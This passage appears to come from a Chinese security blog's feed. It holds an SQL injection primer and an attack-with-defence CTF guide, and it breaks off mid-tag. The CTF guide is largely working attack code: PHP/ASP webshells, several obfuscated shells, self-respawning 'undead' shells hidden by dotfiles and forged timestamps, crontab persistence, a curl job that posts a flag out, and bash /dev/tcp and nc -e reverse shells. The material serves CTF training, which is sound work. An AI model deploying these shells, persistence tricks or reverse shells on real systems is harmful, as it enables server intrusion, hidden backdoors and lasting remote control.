        <content type="html"><![CDATA[<h2 id="什么是sql注入？"><a href="#什么是sql注入？" class="headerlink" title="什么是sql注入？"></a>什么是sql注入？</h2><p><code>SQL注入就是在web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数带入数据库查询，攻击者可以通过构造不同的SQL语句来对数据库的任意操作。</code></p><p>php代码举例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;select * from users where id = $_GET[&#x27;id&#x27;];</span><br></pre></td></tr></table></figure><h2 id="sql注入原理"><a href="#sql注入原理" class="headerlink" title="sql注入原理"></a>sql注入原理</h2><p>sql注入漏洞的产生需要满足以下两个条件：</p><p>1.<code>参数用户可控</code>：前端传给后端的参数内容是用户可以控制的；</p><p>2.<code>参数传入数据库查询</code>：传入的参数拼接到sql语句，且带入数据库查询。</p><p>当传入的id参数为 1’ 时，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1&#x27;</span><br></pre></td></tr></table></figure><p>这不符合数据库语法的规范，所以会报错。</p><p>当传入的id参数为and 1=1 时，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id= 1 and 1 = 1</span><br></pre></td></tr></table></figure><p>因为1 = 1为真，且where语句中id=1也为真，所以页面会返回与id = 1相同的结果，</p><p>当传入的id参数为and 1 =2时，由于 1=2不成立，所以返回假，页面就会返回与id =1不同的结果。</p><h2 id="mysql查询语句"><a href="#mysql查询语句" class="headerlink" title="mysql查询语句"></a>mysql查询语句</h2><p>1.在不知道任何条件时，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 要查询的字段名 from 库名.表名</span><br></pre></td></tr></table></figure><p>2.在知道一条已知条件时，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 要查询的字段名 from 库名.表名 where 已知条件的字段名=&#x27;已知条件的值&#x27;</span><br></pre></td></tr></table></figure><p>3.在知道两条已知条件时，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 要查询的字段名 from 库名.表名 where 已知条件1的字段名 = &#x27;已知条件1的值&#x27; and 已知条件2的字段名=&#x27;已知条件2的值&#x27;</span><br></pre></td></tr></table></figure><h2 id="limit用法"><a href="#limit用法" class="headerlink" title="limit用法"></a>limit用法</h2><p>limit的使用格式为limit m ,n, 其中m是记录开始的位置，从0开始，表示第一条记录；n是指取n条记录。</p><p>eg：limit 0,1表示从第一条记录开始，去一条记录。</p><h2 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h2><p>mysql中常见的注释符： #或  –空格  或  /**/</p><h2 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">内联注释的形式：/*!code*/</span><br></pre></td></tr></table></figure><p>内联注释可以用于整个sql语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3</span><br></pre></td></tr></table></figure><p>?加参数  &amp;连接参数</p><h2 id="sql注入的分类"><a href="#sql注入的分类" class="headerlink" title="sql注入的分类"></a>sql注入的分类</h2><p>1.按照提交的数据类型有：数字型、字符型和搜索型</p><p>2.按照提交方式有：</p><p>  (1)<code>GET注入</code>:提交数据的方式是<code>GET</code>,注入点的位置在GET参数部分。例如有这样一个链接<code> http://xxx.com/news.php?id=1</code>, id是注入点。</p><p>  (2)<code>POST注入</code>:使用POST方式提交数据，注入点位置在POST数据部分，常发生在表单中（输入框）。</p><p>  (3)<code>cookie注入</code>:HTTP请求的时候会带上客户端的cookie，注入点在cookie当中的某个字段中。</p><p>  (4)<code>http头注入</code>:注入点在HTTP请求头部的某个字段中。比如存在User-Agent字段中。严格讲的话，cookie其实应该也算是头部注入的一种形式。因为在HTTP请求的时候，cookie是头部的一个字段。</p><p>3.按照执行效果有：基于布尔的盲注、基于时间的盲注、基于报错注入、联合查询注入</p><h2 id="sql注入危害"><a href="#sql注入危害" class="headerlink" title="sql注入危害"></a>sql注入危害</h2><p>1.<code>数据库信息泄漏</code>：数据库中存放的用户的隐私信息的泄露。</p><p>2.<code>网页篡改</code>：通过操纵数据库对特定网页进行篡改。</p><p>3.<code>网站被挂马，传播恶意软件</code>：修改数据库一些字段值，嵌入网马链接，进行挂马攻击。</p><p>4.<code>数据库被恶意操作</code>：数据库服务器被攻击，数据库的系统管理员账户被篡改。</p><p>5.<code>服务器被远程控制，被安装后门</code>。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。</p><p>6.<code>破坏硬盘数据，瘫痪全系统</code>。</p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>1.<code>过滤危险字符</code>：例如，采用正则表达式匹配union、sleep、load_file等关键字，如果匹配到，则退出程序。</p><p>2.<code>使用预编译语句</code>：使用PDO预编译语句，需要注意，不要将变量直接拼接到PDO语句中，而是使用占位符进行数据库的<code>增加</code>、<code>删除</code>、<code>修改</code>、<code>查询</code>。</p><p>3.<code>特殊字符转义、使用严格的数据类型</code>。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AWD总结</title>
      <link href="/2023/05/06/AWD%E6%80%BB%E7%BB%93/"/>
      <url>/2023/05/06/AWD%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>后台执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php kill.php &gt;/tmp/kill.log 2&gt;&amp;1 &amp;</span><br><span class="line">python3 monitor.py &gt;tmp/monitor.log 2&gt;&amp;1 &amp;  </span><br><span class="line">#监控查看上传文件并删除恶意文件</span><br></pre></td></tr></table></figure><blockquote><p><code>php kill.php</code>命令</p><p><code>&gt; /tmp/kill.log</code> 将命令执行日志写到tmp目录下的kill.log文件中</p><p><code>2&gt;&amp;1 &amp;</code>后台执行命令</p></blockquote><h1 id="AWD-规则"><a href="#AWD-规则" class="headerlink" title="AWD 规则"></a><a href="https://so.csdn.net/so/search?q=AWD&spm=1001.2101.3001.7020">AWD</a> 规则</h1><p>AWD：Attack With Defence，即攻防对抗，比赛中每个队伍维护多台服务器（一般两三台，视小组参赛人数而定），服务器中存在多个漏洞（web层、系统层、中间件层等），利用漏洞攻击其他队伍可以进行得分，加固时间段可自行发现漏洞对服务器进行加固，避免被其他队伍攻击失分。</p><ul><li>1.一般分配Web服务器，服务器（多数为Linux）某处存在flag（一般在根目录下）；</li><li>2.可能会提供一台流量分析虚拟机，可以下载流量文件进行数据分析（较少提供）；</li><li>3.flag在主办方的设定下每隔一定时间刷新一轮；</li><li>4.各队一般都有一个初始分数；</li><li>5.flag一旦被其他队伍拿走，该队扣除一定积分；</li><li>6.得到flag的队伍加分；</li><li>7.一般每个队伍会给一个低权限用户，非root权限；</li><li>8.主办方会对每个队伍的服务进行check，服务器宕机扣除本轮flag分数，扣除的分值由服务check正常的队伍均分。 # 前期准备</li></ul><p>SSH登录</p><p>口令登录</p><p>命令格式: ssh客户端用户名@服务器ip地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh  用户名@ip</span><br><span class="line"></span><br><span class="line">ssh  ctf@</span><br></pre></td></tr></table></figure><p>如果不是默认端口，可以使用-p修改端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 指定端口号 用户名@ip</span><br></pre></td></tr></table></figure><p>密钥登录</p><p>用id_rsa用于登录靶机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sftp -i id_rsa ctf@ip</span><br></pre></td></tr></table></figure><p>压缩网站源码</p><p>用于备份和代码审计修复以及分析攻击点，每个服务器的网站都一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zcvf /tmp/html.zip /var/www/html</span><br></pre></td></tr></table></figure><p><img src="/2023/05/06/AWD%E6%80%BB%E7%BB%93/AWD%E6%80%BB%E7%BB%93%5Cimage-20230725232413954.png" alt="image-20230725232413954"></p><p>2.备份数据库</p><ul><li>备份指定的多个数据库</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -uroot -proot --databases DB1 DB2 &gt; /tmp/db.sql</span><br></pre></td></tr></table></figure><p>无 lock tables 权限的解决方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -uroot -proot --all-databases --skip-lock-tables &gt; /tmp/db.sql</span><br></pre></td></tr></table></figure><ul><li>恢复备份（在 MySQL 终端下执行）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source FILE_PATH</span><br></pre></td></tr></table></figure><ul><li>重置 MySQL 密码（在 MySQL 终端下执行）</li></ul><p>方法 1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set password for 用户名@localhost = password(&quot;新密码&quot;)</span><br></pre></td></tr></table></figure><p>方法 2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqladmin -u用户名 -p旧密码 password 新密码</span><br></pre></td></tr></table></figure><p>3.下载到本地</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P ssh_port user@host_ip:/tmp/bak.sql local_file</span><br></pre></td></tr></table></figure><h2 id="查找预留后门"><a href="#查找预留后门" class="headerlink" title="查找预留后门"></a>查找预留后门</h2><p>用D盾扫描备份的文件，查找预留后门，第一时间删除自己靶机上的后门，也可以利用后门攻击其他靶机。</p><p>可以使用 seay进行代码审计</p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>端口扫描是信息收集的一部分，需要知道目标服务器开放了哪些端口，使用端口扫描工具有御剑高速TCP全端口扫描工具、nmap和masscan等进行扫描。</p><p>所有服务器配置都是一样的，也可以看己方靶机开放了哪些端口。</p><p>以下是一些服务端口的漏洞：</p><p>22：ssh弱口令</p><p>873：未授权访问漏洞</p><p>3306：mysql弱口令</p><p>6379：redis未授权访问漏洞</p><h1 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>信息收集</p><ul><li>nmap、Routescan</li><li>Python 脚本</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">for x in range(2,255):</span><br><span class="line">    url = &quot;&lt;http://192.168.1&gt;.&#123;&#125;&quot;.format(x)</span><br><span class="line">    try:</span><br><span class="line">        r = requests.post(url)</span><br><span class="line">        print(url)</span><br><span class="line">        except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure><h2 id="后门利用"><a href="#后门利用" class="headerlink" title="后门利用"></a>后门利用</h2><p>curl读flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\\Users\\admin&gt;curl &quot;&lt;http://192.168.182.130:8801/include/shell.php&gt;&quot; -d &quot;admin_ccmd=system(&#x27;cat /f*&#x27;);&quot;</span><br><span class="line">SL&#123;4a0be463dd85555090f2216795677916d2447242&#125;</span><br><span class="line">flag&#123;glzjin_wants_a_girl_friend&#125;</span><br></pre></td></tr></table></figure><p>脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">端口</span><br><span class="line">#coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">url_head=&quot;&lt;http://192.168.182.130&gt;&quot;   #网段</span><br><span class="line">url=&quot;&quot;</span><br><span class="line">shell_addr=&quot;/upload/url/shell.php&quot; #木马路径</span><br><span class="line">passwd=&quot;pass&quot;                   #木马密码</span><br><span class="line">#port=&quot;80&quot;</span><br><span class="line">payload = &#123;passwd: &#x27;System(\\&#x27;cat /flag\\&#x27;);&#x27;&#125;</span><br><span class="line"># find / -name &quot;flag*&quot;</span><br><span class="line"></span><br><span class="line">#清空上次记录</span><br><span class="line">flag=open(&quot;flag.txt&quot;,&quot;w&quot;)</span><br><span class="line">flag.close()</span><br><span class="line"></span><br><span class="line">flag=open(&quot;flag.txt&quot;,&quot;a&quot;)</span><br><span class="line"></span><br><span class="line">for i in range(8000,8004):</span><br><span class="line">    url=url_head+&quot;:&quot;+str(i)+shell_addr</span><br><span class="line">    try:</span><br><span class="line">        res=requests.post(url,payload)#,timeout=1</span><br><span class="line">        if res.status_code == requests.codes.ok:</span><br><span class="line">            result = res.text</span><br><span class="line">            print (result)</span><br><span class="line">            flag.write(result+&quot;\\n&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print (&quot;shell 404&quot;)</span><br><span class="line">    except:</span><br><span class="line">        print (url+&quot; connect shell fail&quot;)</span><br><span class="line"></span><br><span class="line">flag.close()</span><br></pre></td></tr></table></figure><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><p>常用语言的一句话木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php： &lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;      &lt;?php eval($_GET[&#x27;pass&#x27;]);</span><br><span class="line">asp：   &lt;%eval request (&quot;pass&quot;)%&gt;</span><br><span class="line">aspx：  &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure><p>蚁剑连接get型木马，之前一直不会用蚁剑连接get型木马，这里记录一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_GET[&#x27;pass&#x27;]);</span><br><span class="line"></span><br><span class="line">/shell.php?pass=eval($_POST[1]);</span><br><span class="line">连接密码：1</span><br></pre></td></tr></table></figure><h2 id="隐藏shell"><a href="#隐藏shell" class="headerlink" title="隐藏shell"></a>隐藏shell</h2><p>shell很容易被发现，被删除就gg了，可以采用一些操作隐藏shell或使shell无法被删除</p><p><strong>1.把shell.php命名为.shell.php</strong></p><p>.shell.php在执行ls时无法被查看到，搭配ls的参数才能被发现</p><p>完整命令如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[sss@ecs-centos-7 awd]$ echo &quot;iamshell&quot;&gt;shell.php</span><br><span class="line">[sss@ecs-centos-7 awd]$ ls</span><br><span class="line">shell.php</span><br><span class="line">[sss@ecs-centos-7 awd]$ mv shell.php .shell.php</span><br><span class="line">[sss@ecs-centos-7 awd]$ ls</span><br><span class="line">[sss@ecs-centos-7 awd]$ ls -al</span><br><span class="line">总用量 12</span><br><span class="line">drwxrwxr-x 2 sss sss 4096 12月  29 22:52 .</span><br><span class="line">drwx------ 4 sss sss 4096 12月  29 22:51 ..</span><br><span class="line">-rw-rw-r-- 1 sss sss    9 12月  29 22:52 .shell.php</span><br></pre></td></tr></table></figure><p><strong>2.把shell.php命名为-shell.php</strong></p><p>从上面可以看出，ls加参数才能查看到shell，那么我们直接写一个-shell.php、</p><p>命令行会把-后面的内容当成参数执行，执行即使被发现，使用rm命令进行删除，会被当成是rm的参数，就会发生报错，无法删除shell，目的也达到了</p><p>完整命令如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[sss@ecs-centos-7 awd]$ ls</span><br><span class="line">-shell.php</span><br><span class="line">[sss@ecs-centos-7 awd]$ rm -shell.php</span><br><span class="line">rm：无效选项 -- s</span><br><span class="line">Try &#x27;rm ./-shell.php&#x27; to remove the file &quot;-shell.php&quot;.</span><br><span class="line">Try &#x27;rm --help&#x27; for more information.</span><br><span class="line">[sss@ecs-centos-7 awd]$ rm -rf -shell.php</span><br><span class="line">rm：无效选项 -- s</span><br><span class="line">Try &#x27;rm ./-shell.php&#x27; to remove the file &quot;-shell.php&quot;.</span><br><span class="line">Try &#x27;rm --help&#x27; for more information.</span><br></pre></td></tr></table></figure><h2 id="特殊的shell"><a href="#特殊的shell" class="headerlink" title="特殊的shell"></a>特殊的shell</h2><p>shell1：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php ($_=@$_GET[2]).@$_($_POST[1])?&gt;</span><br></pre></td></tr></table></figure><p>连接方式：php?2=assert密码是1。</p><p>shell2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=chr( 96^5);</span><br><span class="line">$b=chr( 57^79);</span><br><span class="line">$c=chr( 15^110);</span><br><span class="line">$d=chr( 58^86);</span><br><span class="line">$e= &#x27;($_REQUEST[C])&#x27;;</span><br><span class="line">@assert($a.$b.$c.$d.$e);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>配置为?b=))99(rhC(tseuqeR+lave</p><p>shell3：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sF= &quot;PCT4BA6ODSE_&quot;;$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=$&#123;strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])&#125;[&#x27;n985de9&#x27;];if(isset($s22))&#123;eval($s21($s22));&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>配置填n985de9=QGV2YWwoJF9QT1NUWzBdKTs=</p><p>连接密码:0（零）</p><p>shell4：MD5木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(md5($_POST[&#x27;pass&#x27;])==&#x27;d8d1a1efe0134e2530f503028a825253&#x27;)</span><br><span class="line">@eval($_POST[&#x27;cmd&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>shell5：MD5木马+利用header</p><p>2021ISCC河南赛区线下赛就是这种shell，当时差点没看出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &#x27;hello&#x27;;</span><br><span class="line">if(md5($_POST[&#x27;pass&#x27;])==&#x27;d8d1a1efe0134e2530f503028a825253&#x27;)</span><br><span class="line">if (@$_SERVER[&#x27;HTTP_USER_AGENT&#x27;] == &#x27;flag&#x27;)&#123;</span><br><span class="line">$test= &#x27;flag&#x27;;</span><br><span class="line">header(&quot;flag:$test&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h2><p>不死马示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ignore_user_abort(true);</span><br><span class="line">set_time_limit(0);</span><br><span class="line">unlink(__FILE__);</span><br><span class="line">$file = &#x27;shell.php&#x27;;</span><br><span class="line">$code = &#x27;&lt;?php if(md5($_POST[&quot;passwd&quot;])==&quot;6daf17e539bf44591fad8c81b4a293d7&quot;)&#123;@eval($_REQUEST[&#x27;cmd&#x27;]);&#125; ?&gt;&#x27;;</span><br><span class="line">while (1)&#123;</span><br><span class="line">    file_put_contents($file,$code);</span><br><span class="line">    system(&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; shell2.php&#x27;);</span><br><span class="line">    usleep(5000);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">#passwd=y0range857</span><br><span class="line">#POST传参：passwd=y0range857&amp;a=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure><p>将这个文件上传到服务器，然后进行访问，会在该路径下一直生成一个名字为shell2.php的shell文件，然后使用caidao输入<a href="http://xxx/shell2.php?pass=pass%E7%9A%84%E8%B7%AF%E5%BE%84%EF%BC%8C%E5%AF%86%E7%A0%81%E4%B8%BAa%E5%B0%B1%E5%8F%AF%E4%BB%A5%E9%93%BE%E6%8E%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%EF%BC%8C%E7%94%B1%E4%BA%8Epass%E6%98%AFmd5%E5%8A%A0%E5%AF%86%E5%BE%88%E9%9A%BE%E8%A2%AB%E7%A0%B4%E8%A7%A3%E4%B9%9F%E5%8F%AF%E4%BB%A5%E5%81%9A%E5%88%B0%E9%9A%90%E8%94%BD,md5%E5%80%BC%E5%8F%AF%E4%BB%A5%E9%9A%8F%E6%84%8F%E5%AE%9A%E4%B9%89%E3%80%82">http://xxx/shell2.php?pass=pass的路径，密码为a就可以链接一句话，由于pass是md5加密很难被破解也可以做到隐蔽,md5值可以随意定义。</a></p><p>写入shell， at.php内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ignore_user_abort(true);</span><br><span class="line">set_time_limit(0);</span><br><span class="line">unlink(__FILE__);</span><br><span class="line">$file = &#x27;.login.php&#x27;;</span><br><span class="line">$file1 = &#x27;/admin/.register.php&#x27;;</span><br><span class="line">$code = &#x27;&lt;?php if(md5($_GET[&quot;passwd&quot;])==&quot;6daf17e539bf44591fad8c81b4a293d7&quot;)&#123;@eval($_REQUEST[&quot;at&quot;]);&#125; ?&gt;&#x27;;</span><br><span class="line">while (1)&#123;</span><br><span class="line">    file_put_contents($file,$code);</span><br><span class="line">    system(&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .login.php&#x27;);</span><br><span class="line">    file_put_contents($file1,$code);</span><br><span class="line">    system(&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; /admin/.register.php&#x27;);</span><br><span class="line">    usleep(5000);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>浏览器访问at.php，会生成不死马at2.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/upload/at.php</span><br></pre></td></tr></table></figure><p>再传入，执行命令，getshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/upload/at2.php?passwd=obse007&amp;at=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p>预留后门的权限维持特别重要，不要急着拿flag，往后每一轮预留后门都会减少，未雨绸缪。</p><p><strong>crontab定时任务</strong></p><p>1.使用定时任务写马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&#x27;echo &quot;* * * * * echo \\&quot;&lt;?php  if(md5(\\\\\\\\\\\\\\\\\\$_POST[pass])==\\&#x27;462d4a0e7cedd6b024a4d99f10c614d1\\&#x27;)&#123;@eval(\\\\\\\\\\\\\\\\\\$_POST[1]);&#125;  \\&quot; &gt; /var/www/html/.index.php\\n* * * * * chmod 777 /var/www/html/.index.php&quot; | crontab;whoami&#x27;);</span><br></pre></td></tr></table></figure><p>密码：atkx</p><p>来指定用户运行指定的定时任务</p><p>2.使用定时任务发送带有flag的请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash# 编辑 crontab：crontab -e</span><br><span class="line">*/5 * * * * curl 10.10.10.5:8000/submit_flag/ -d &#x27;flag=&#x27;$(cat /home/web/flag/flag)&#x27;&amp;token=7gsVbnRb6ToHRMxrP1zTBzQ9BeM05oncH9hUoef7HyXXhSzggQoLM2uXwjy1slr0XOpu8aS0qrY&#x27;</span><br><span class="line"># 查询 crontab：crontab -l</span><br></pre></td></tr></table></figure><p>3.使用定时任务反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -c bash&#x27;bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1&#x27;</span><br><span class="line"></span><br><span class="line">nc -e /bin/bash 1.3.3.7 4444 bash</span><br></pre></td></tr></table></figure><p><strong>反弹shell</strong></p><p>nc反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.182.130/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>本地</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 6666</span><br></pre></td></tr></table></figure><h2 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h2><p>软连接语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s  [shell路径]   [新文件路径]</span><br></pre></td></tr></table></figure><p>使用方法：</p><p>访问/upload/new.php，实际上是访问/upload/shell.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s  /var/www/html/upload/shell.php     /var/www/html/upload/new.php</span><br></pre></td></tr></table></figure><p>软连接利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@086f12c38b93:~# ln -s /flag /var/www/html/css/flag.css</span><br><span class="line">root@086f12c38b93:~# cat /var/www/html/css/flag.css</span><br><span class="line">SL&#123;3c7c719b9fb980dca71080b9d96c9c6aa03c16c0&#125;</span><br></pre></td></tr></table></figure><p>然后访问url/css/flag.css即可得到flag</p><h2 